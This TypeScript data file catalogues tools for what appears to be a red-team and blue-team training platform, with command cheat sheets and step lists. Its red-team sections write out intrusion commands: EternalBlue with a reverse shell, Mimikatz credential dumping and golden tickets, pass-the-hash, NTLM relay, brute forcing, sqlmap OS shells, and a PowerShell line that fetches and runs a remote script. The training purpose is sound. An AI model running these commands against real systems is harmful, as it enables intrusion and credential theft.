export type ToolNode = 'node-01' | 'node-02' | 'web' | 'api'
export type TeamType = 'red' | 'blue' | 'bug-hunting'
export type ActionType = 'launch' | 'commands' | 'methodology' | 'both' | 'all'

export interface Tool {
  id: string
  name: string
  description: string
  node: ToolNode
  webUrl?: string
  guacNode?: 'node-01' | 'node-02'
  commands?: string[]
  methodology?: string[]
  actions: ('launch' | 'commands' | 'methodology')[]
}

export interface ToolCategory {
  id: string
  name: string
  team: TeamType
  tools: Tool[]
}

export const GUACAMOLE_URL = 'https://guac.cyberopsplatform.co.uk'
export const NODE01_LABEL = 'node-01 — Kali Linux'
export const NODE02_LABEL = 'node-02 — Blue Team'

export const toolCategories: ToolCategory[] = [
  {
    id: 'recon',
    name: 'Reconnaissance & OSINT',
    team: 'red',
    tools: [
      { id: 'nmap', name: 'Nmap / Rustscan', description: 'Port scan', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Quick discovery', 'nmap -sn 10.0.0.0/24', '', '# Full scan + scripts', 'nmap -sV -sC -p- --open -T4 <IP>', '', '# Rustscan → nmap', 'rustscan -a <IP> --ulimit 5000 -- -sV -sC', '', '# OS detection', 'nmap -O -sV <IP>', '', '# UDP scan (top 20)', 'nmap -sU --top-ports 20 <IP>', '', '# NSE vuln scripts', 'nmap --script vuln <IP>', '', '# Output XML', 'nmap -sV -oX output.xml <IP>'] },
      { id: 'shodan', name: 'Shodan / Censys', description: 'Internet scan', node: 'api', webUrl: '/dashboard', actions: ['launch', 'commands'], commands: ['# Shodan CLI (needs API key)', 'shodan search "hostname:<domain>"', 'shodan host <IP>', 'shodan count "port:8080 org:<org>"', '', '# Useful filters', 'shodan search "ssl:<domain> port:443"', 'shodan search "product:Apache country:GB"', '', '# Export', 'shodan download --limit 1000 results "org:<org>"'] },
      { id: 'theharvester', name: 'theHarvester', description: 'OSINT emails/subdomains', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Emails and subdomains', 'theHarvester -d <domain> -b all', '', '# Specific sources', 'theHarvester -d <domain> -b google,bing,linkedin', '', '# Save results', 'theHarvester -d <domain> -b all -f output.html', '', '# Limit results', 'theHarvester -d <domain> -b google -l 500'] },
      { id: 'recon-ng', name: 'Recon-ng', description: 'Framework OSINT', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Iniciar', 'recon-ng', '', '# Criar workspace', 'workspaces create <name>', '', '# Install modules', 'marketplace install all', '', '# DNS brute force', 'modules load recon/domains-hosts/brute_hosts', 'options set SOURCE <domain>', 'run', '', '# Harvest emails', 'modules load recon/domains-contacts/whois_pocs', 'options set SOURCE <domain>', 'run'] },
      { id: 'subfinder', name: 'Subfinder + Amass', description: 'Subdomain enumeration', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Subfinder', 'subfinder -d <domain> -all -recursive', 'subfinder -d <domain> -o subs.txt', '', '# Amass enum passiva', 'amass enum -passive -d <domain>', '', '# Amass enum activa', 'amass enum -active -d <domain> -brute', '', '# Combine results', 'cat subs.txt | sort -u | httpx -silent', '', '# DNS resolve', 'subfinder -d <domain> | dnsx -silent'] },
      { id: 'maltego', name: 'Maltego CE', description: 'Link analysis', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'methodology'], methodology: ['1. Open Maltego on Kali (node-01)', '2. Create a new graph → "New Graph"', '3. Drag a "Domain" entity → enter the target domain', '4. Right-click → Run all transforms', '5. Expand DNS → IPs → ASN → Whois', '6. Add a "Person" entity for employee OSINT', '7. Run transforms on LinkedIn/Twitter entities', '8. Export the graph as PDF for the report'] },
    ],
  },
  {
    id: 'exploitation',
    name: 'Exploitation',
    team: 'red',
    tools: [
      { id: 'metasploit', name: 'Metasploit', description: 'Framework', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands', 'methodology'], commands: ['# Iniciar', 'msfconsole', '', '# Search exploits', 'search type:exploit name:eternalblue', 'use exploit/windows/smb/ms17_010_eternalblue', '', '# Configurar', 'set RHOSTS <IP>', 'set LHOST <your_IP>', 'set LPORT 4444', 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', 'run', '', '# Meterpreter', 'sysinfo', 'getuid', 'hashdump', 'shell'], methodology: ['1. Identify a vulnerable service (Nmap -sV)', '2. search <service> in msfconsole', '3. Check the exploit rank (Excellent/Great)', '4. set RHOSTS, LHOST, PAYLOAD', '5. check (verifies without exploiting)', '6. exploit / run', '7. Se Meterpreter: getuid → migrate → hashdump', '8. Document CVE, payload, opened session'] },
      { id: 'burp', name: 'Burp Suite CE', description: 'Web proxy', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'methodology'], methodology: ['1. Start Burp Suite on Kali', '2. Proxy → Intercept → Open Browser', '3. Browse the target application', '4. Target → Site map → review endpoints', '5. Scanner (CE: manual) → Repeater to test inputs', '6. Intruder → Sniper for parameter brute forcing', '7. Decoder to manipulate tokens/cookies', '8. Comparer to diff responses', '9. Export findings to the report'] },
      { id: 'sqlmap', name: 'SQLmap', description: 'SQL injection auto', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Basic', 'sqlmap -u "http://target/page?id=1"', '', '# With session cookie', 'sqlmap -u "http://target/page" --cookie="session=abc123"', '', '# POST request', 'sqlmap -u "http://target/login" --data="user=a&pass=b"', '', '# Dump databases', 'sqlmap -u "http://target/page?id=1" --dbs', '', '# Dump table', 'sqlmap -u "http://target/page?id=1" -D dbname -T users --dump', '', '# Bypass WAF', 'sqlmap -u "http://target/page?id=1" --tamper=space2comment', '', '# OS shell (if privileged)', 'sqlmap -u "http://target/page?id=1" --os-shell'] },
      { id: 'hydra', name: 'Hydra', description: 'Brute force', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# SSH brute force', 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<IP>', '', '# HTTP POST login', 'hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"', '', '# FTP', 'hydra -l admin -P rockyou.txt ftp://<IP>', '', '# RDP', 'hydra -l administrator -P rockyou.txt rdp://<IP>', '', '# Multiple users', 'hydra -L users.txt -P rockyou.txt ssh://<IP>', '', '# Throttle (avoid lockout)', 'hydra -l admin -P rockyou.txt -t 4 -w 5 ssh://<IP>'] },
      { id: 'responder', name: 'Responder', description: 'LLMNR poisoning', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands', 'methodology'], commands: ['# Start Responder on the network interface', 'sudo responder -I eth0 -rdwv', '', '# Analyze captured hashes', 'cat /usr/share/responder/logs/SMB-NTLMv2-*.txt', '', '# Crack hash with hashcat', 'hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt', '', '# Relay attack (with ntlmrelayx)', 'python3 ntlmrelayx.py -tf targets.txt -smb2support'], methodology: ['1. Confirm LLMNR/NBT-NS is active on the network (default on Windows)', '2. Run Responder on the correct interface', '3. Wait for Windows machines to resolve non-existent names', '4. Responder answers and captures NTLMv2 hashes', '5. Crack with hashcat -m 5600', '6. Or relay with ntlmrelayx for direct access'] },
    ],
  },
  {
    id: 'active-directory',
    name: 'Active Directory',
    team: 'red',
    tools: [
      { id: 'bloodhound', name: 'BloodHound CE', description: 'AD graph', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'methodology'], methodology: ['1. Run SharpHound (collector) on the compromised Windows host', '   SharpHound.exe --CollectionMethods All --ZipFileName output.zip', '2. Or use bloodhound-python for remote collection:', '   bloodhound-python -u user -p pass -d domain.local -dc <DC_IP> -c All', '3. Import the ZIP into BloodHound CE', '4. Useful pre-built queries:', '   - "Find Shortest Paths to Domain Admins"', '   - "Find All Domain Admins"', '   - "Shortest Path from Owned Principals"', '5. Mark compromised users as "Owned"', '6. Follow the attack path to Domain Admin'] },
      { id: 'impacket', name: 'Impacket suite', description: 'SMB/Kerberos', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# GetNPUsers (AS-REP Roasting)', 'GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip <DC_IP>', '', '# GetUserSPNs (Kerberoasting)', 'GetUserSPNs.py domain.local/user:pass -dc-ip <DC_IP> -request', '', '# secretsdump (NTDS / SAM)', 'secretsdump.py domain.local/admin:pass@<DC_IP>', '', '# wmiexec (remote shell)', 'wmiexec.py domain.local/admin:pass@<IP>', '', '# smbclient', 'smbclient.py domain.local/admin:pass@<IP>', '', '# Pass-the-Hash', 'psexec.py -hashes :NTLM_HASH domain.local/admin@<IP>'] },
      { id: 'crackmapexec', name: 'CrackMapExec', description: 'Lateral movement', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# SMB sweep', 'crackmapexec smb 10.0.0.0/24', '', '# Valid credentials?', 'crackmapexec smb <IP> -u admin -p password', '', '# Pass-the-Hash', 'crackmapexec smb <IP> -u admin -H <NTLM_HASH>', '', '# Dump SAM', 'crackmapexec smb <IP> -u admin -p pass --sam', '', '# Dump LSA secrets', 'crackmapexec smb <IP> -u admin -p pass --lsa', '', '# Shares', 'crackmapexec smb <IP> -u admin -p pass --shares', '', '# WinRM (lateral)', 'crackmapexec winrm <IP> -u admin -p pass -x "whoami"'] },
      { id: 'mimikatz', name: 'Mimikatz', description: 'Credential dump', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# In Meterpreter (load kiwi):', 'load kiwi', 'creds_all', '', '# Direct (requires SYSTEM):', 'privilege::debug', 'sekurlsa::logonpasswords', '', '# Dump NTDS (Domain Controller)', 'lsadump::dcsync /domain:domain.local /all', '', '# Golden Ticket', 'kerberos::golden /user:admin /domain:domain.local /sid:<SID> /krbtgt:<HASH>', '', '# Pass-the-Ticket', 'kerberos::ptt ticket.kirbi'] },
      { id: 'powersploit', name: 'PowerSploit', description: 'PS post-exploit', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Import module', 'IEX (New-Object Net.WebClient).DownloadString("http://<LHOST>/PowerSploit.ps1")', '', '# Reconnaissance', 'Get-NetDomain', 'Get-NetUser | select samaccountname,memberof', 'Get-NetGroupMember "Domain Admins"', '', '# Privilege Escalation', 'Invoke-AllChecks', 'Find-LocalAdminAccess', '', '# Persistence', 'Install-SSP', 'Add-Persistence -ScriptBlock { ... }'] },
    ],
  },
  {
    id: 'detection',
    name: 'Detection & Analysis',
    team: 'blue',
    tools: [
      { id: 'wazuh', name: 'Wazuh Manager', description: 'SIEM/EDR', node: 'node-02', webUrl: 'https://wazuh.cyberopsplatform.co.uk', guacNode: 'node-02', actions: ['launch', 'commands'], commands: ['# View active alerts', 'sudo tail -f /var/ossec/logs/alerts/alerts.log', '', '# Test rules', 'sudo /var/ossec/bin/ossec-logtest', '', '# Restart agent', 'sudo systemctl restart wazuh-agent', '', '# View connected agents', 'sudo /var/ossec/bin/agent_control -l', '', '# FIM (File Integrity)', 'sudo /var/ossec/bin/syscheck_control -i 001', '', '# API (local)', 'curl -k -X GET "https://localhost:55000/" -u wazuh:wazuh'] },
      { id: 'opensearch', name: 'OpenSearch', description: 'Log search', node: 'node-02', guacNode: 'node-02', actions: ['launch', 'commands'], commands: ['# Check cluster health', 'curl -XGET "http://localhost:9200/_cluster/health?pretty"', '', '# List indices', 'curl -XGET "http://localhost:9200/_cat/indices?v"', '', '# Search logs Wazuh', 'curl -XGET "http://localhost:9200/wazuh-alerts-*/_search" -H "Content-Type: application/json" -d \'{"query":{"match":{"rule.level":{"query":"12"}}}}\'' , '', '# Kibana/Dashboards', 'xdg-open http://localhost:5601'] },
      { id: 'wireshark', name: 'Wireshark', description: 'Packet analysis', node: 'node-02', guacNode: 'node-02', actions: ['launch', 'commands'], commands: ['# tshark — CLI capture', 'sudo tshark -i eth0 -w capture.pcap', '', '# Filter HTTP', 'tshark -r capture.pcap -Y "http"', '', '# Filter by IP', 'tshark -r capture.pcap -Y "ip.addr==10.0.0.1"', '', '# Extract HTTP credentials', 'tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data', '', '# Follow TCP stream', 'tshark -r capture.pcap -z follow,tcp,ascii,0', '', '# Protocol statistics', 'tshark -r capture.pcap -qz io,phs'] },
      { id: 'zeek', name: 'Zeek', description: 'Network IDS', node: 'node-02', guacNode: 'node-02', actions: ['launch', 'commands'], commands: ['# Analyze pcap', 'zeek -r capture.pcap', '', '# Monitor in real time', 'sudo zeek -i eth0 local', '', '# Generated logs', 'ls -la *.log', '', '# View connections', 'cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto', '', '# DNS queries', 'cat dns.log | zeek-cut query answers', '', '# HTTP requests', 'cat http.log | zeek-cut host uri method', '', '# Transferred files', 'cat files.log | zeek-cut source filename mime_type'] },
    ],
  },
  {
    id: 'forensics',
    name: 'Threat Intel & Forensics',
    team: 'blue',
    tools: [
      { id: 'misp', name: 'MISP', description: 'Threat sharing', node: 'node-02', webUrl: 'https://misp.cyberopsplatform.co.uk', guacNode: 'node-02', actions: ['launch', 'methodology'], methodology: ['1. Open MISP (node-02)', '2. Events → Add Event → create a new event', '3. Add Attributes: IPs, domains, hashes, TTPs', '4. Classify with TLP (White/Green/Amber/Red)', '5. Add Galaxy tags: MITRE ATT&CK TTPs', '6. Correlate → see other related events', '7. Export → STIX2 / JSON for sharing', '8. Feed management → subscribe to external feeds (CIRCL, etc.)'] },
      { id: 'volatility', name: 'Volatility 3', description: 'Memory forensics', node: 'node-02', guacNode: 'node-02', actions: ['launch', 'commands'], commands: ['# Dump info', 'python3 vol.py -f memory.dmp windows.info', '', '# Processes', 'python3 vol.py -f memory.dmp windows.pslist', 'python3 vol.py -f memory.dmp windows.pstree', '', '# Network connections', 'python3 vol.py -f memory.dmp windows.netstat', '', '# DLL injection / hooking', 'python3 vol.py -f memory.dmp windows.malfind', '', '# Hashes (hashdump)', 'python3 vol.py -f memory.dmp windows.hashdump', '', '# Strings in a specific process', 'python3 vol.py -f memory.dmp windows.strings --pid <PID>', '', '# Registry hives', 'python3 vol.py -f memory.dmp windows.registry.hivelist'] },
      { id: 'autopsy', name: 'Autopsy', description: 'Disk forensics', node: 'node-02', guacNode: 'node-02', actions: ['launch', 'methodology'], methodology: ['1. Open Autopsy on node-02', '2. New Case → enter case name and number', '3. Add Data Source → disk image (.dd, .E01, .vmdk)', '4. Select ingest modules: File Type, Keyword Search, Web Artifacts, Email, etc.', '5. Wait for automatic analysis', '6. Explore: Recent Documents, Web History, Deleted Files', '7. Keyword Search → search relevant terms', '8. Tag evidence → Add Tag → generate HTML/PDF report'] },
      { id: 'cyberchef', name: 'CyberChef', description: 'Data decode', node: 'web', webUrl: 'https://gchq.github.io/CyberChef/', actions: ['launch', 'commands'], commands: ['# Decoder base64', 'echo "SGVsbG8=" | base64 -d', '', '# URL decode', 'python3 -c "import urllib.parse; print(urllib.parse.unquote(\'...\'")', '', '# Hex to ASCII', 'echo "48656c6c6f" | xxd -r -p', '', '# ROT13', 'echo "Uryyb" | tr "A-Za-z" "N-ZA-Mn-za-m"', '', '# JWT decode (sem verificar assinatura)', 'echo "<JWT>" | cut -d. -f2 | base64 -d 2>/dev/null', '', '→ Or use the web UI for complex operations (recipe chains)'] },
      { id: 'yara', name: 'YARA', description: 'Malware rules', node: 'node-02', guacNode: 'node-02', actions: ['launch', 'commands'], commands: ['# Scan a file with a rule', 'yara regra.yar ficheiro_suspeito', '', '# Recursive scan', 'yara -r regra.yar /caminho/pasta/', '', '# Multiple rules', 'yara rules/*.yar ficheiro_suspeito', '', '# Example YARA rule:', 'rule Malware_Sample {', '  strings:', '    $s1 = "malware_string" ascii', '    $h1 = { 6D 61 6C 77 61 72 65 }', '  condition:', '    any of them', '}', '', '# Download community rules', 'git clone https://github.com/Yara-Rules/rules'] },
      { id: 'virustotal', name: 'VirusTotal API', description: 'Hash lookup', node: 'api', webUrl: '/dashboard', actions: ['launch', 'commands'], commands: ['# Hash lookup via curl', 'curl -s "https://www.virustotal.com/api/v3/files/<SHA256>" -H "x-apikey: <VT_API_KEY>"', '', '# URL scan', 'curl -s -X POST "https://www.virustotal.com/api/v3/urls" -H "x-apikey: <VT_API_KEY>" -d "url=http://target.com"', '', '# IP analysis', 'curl -s "https://www.virustotal.com/api/v3/ip_addresses/<IP>" -H "x-apikey: <VT_API_KEY>"', '', '→ Or use the Security Dashboard panel (already integrated)'] },
    ],
  },
  {
    id: 'web-api',
    name: 'Web & API',
    team: 'bug-hunting',
    tools: [
      { id: 'burp-pro', name: 'Burp Suite Pro', description: 'Full scan', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'methodology'], methodology: ['1. Configure the proxy (127.0.0.1:8080) in the browser', '2. Target → Scope → Add → enter the target domain', '3. Spider / Crawler → map the whole application', '4. Scanner → Active Scan → automatic vulnerability scan', '5. Repeater → test manually: SQLi, XSS, SSRF, IDOR', '6. Intruder → Sniper/Cluster Bomb for parameter fuzzing', '7. Collaborator → detect out-of-band interactions (SSRF, XXE)', '8. Useful extensions: Logger++, Turbo Intruder, Active Scan++', '9. Export an HTML report of findings'] },
      { id: 'ffuf', name: 'ffuf', description: 'Web fuzzer', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Directory fuzzing', 'ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://target/FUZZ', '', '# Subdomain fuzzing', 'ffuf -w subdomains.txt -u http://FUZZ.target.com -H "Host: FUZZ.target.com"', '', '# Parameter fuzzing', 'ffuf -w params.txt -u "http://target/page?FUZZ=test"', '', '# POST body fuzzing', 'ffuf -w payloads.txt -u http://target/login -X POST -d "user=admin&pass=FUZZ"', '', '# Filter by response size', 'ffuf -w list.txt -u http://target/FUZZ -fs 1234', '', '# Output JSON', 'ffuf -w list.txt -u http://target/FUZZ -o results.json -of json'] },
      { id: 'nuclei', name: 'Nuclei', description: 'Template scan', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Update templates', 'nuclei -update-templates', '', '# Basic scan', 'nuclei -u https://target.com', '', '# Only critical/high', 'nuclei -u https://target.com -s critical,high', '', '# Multiple targets', 'nuclei -l targets.txt -t technologies/', '', '# CVE templates', 'nuclei -u https://target.com -t cves/', '', '# Without SSL verify', 'nuclei -u https://target.com -ni', '', '# Output', 'nuclei -u https://target.com -o results.txt -json'] },
      { id: 'httpx', name: 'httpx / Wayback', description: 'HTTP probe', node: 'node-01', guacNode: 'node-01', actions: ['launch', 'commands'], commands: ['# Check which subdomains are alive', 'cat subs.txt | httpx -silent -status-code -title', '', '# Tech detection', 'cat subs.txt | httpx -tech-detect', '', '# Screenshots', 'cat subs.txt | httpx -screenshot -o screenshots/', '', '# Wayback Machine URLs', 'waybackurls target.com | tee wayback.txt', '', '# Filter interesting endpoints', 'cat wayback.txt | grep "?.*=" | sort -u', '', '# gau (GetAllUrls)', 'gau target.com | grep "\\.js$"'] },
    ],
  },
]
